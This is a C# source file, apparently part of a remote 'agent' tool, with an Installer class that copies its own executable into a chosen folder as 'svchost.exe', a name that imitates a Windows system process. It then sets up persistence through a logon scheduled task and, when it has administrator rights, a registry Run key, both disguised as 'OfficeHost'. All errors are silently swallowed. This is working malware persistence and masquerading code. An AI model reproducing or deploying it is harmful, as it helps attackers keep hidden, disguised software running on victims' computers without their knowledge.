using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Principal;
using System.Threading.Tasks;

namespace Libra.Agent.Helper
{
    internal class Installer
    {
        public static async Task InstallAgentAsync(string destDirectory)
        {
            try
            {
                if (!Directory.Exists(destDirectory))
                {
                    Directory.CreateDirectory(destDirectory);
                }

                string destPath = Path.Combine(destDirectory, "svchost.exe");

                if (!File.Exists(destPath))
                {
                    File.Copy(Environment.ProcessPath, destPath);
                }

                await SetTaskSchedulerAsync(destPath);
                if (IsRunAsAdministrator())
                {
                    SetRegistryStartup(destPath);
                }
            }
            catch
            {
            }
        }

        private static Task SetTaskSchedulerAsync(string exePath)
        {
            return Task.Run(() =>
            {
                string command = $"/create /tn \"OfficeHost\" /tr \"{exePath}\" /sc onlogon /f";
                ExecuteCommand("schtasks", command);
            });
        }

        private static void ExecuteCommand(string command, string args)
        {
            try
            {
                using (Process process = new Process())
                {
                    process.StartInfo.FileName = command;
                    process.StartInfo.Arguments = args;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.UseShellExecute = false;
                    process.Start();
                    process.WaitForExit();
                }
            }
            catch
            {
            }
        }

        private static void SetRegistryStartup(string exePath)
        {
            try
            {
                string registryKeyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(registryKeyPath, true))
                {
                    if (key != null)
                    {
                        key.SetValue("OfficeHost", exePath);
                    }
                }
            }
            catch
            {
            }
        }
        private static bool IsRunAsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}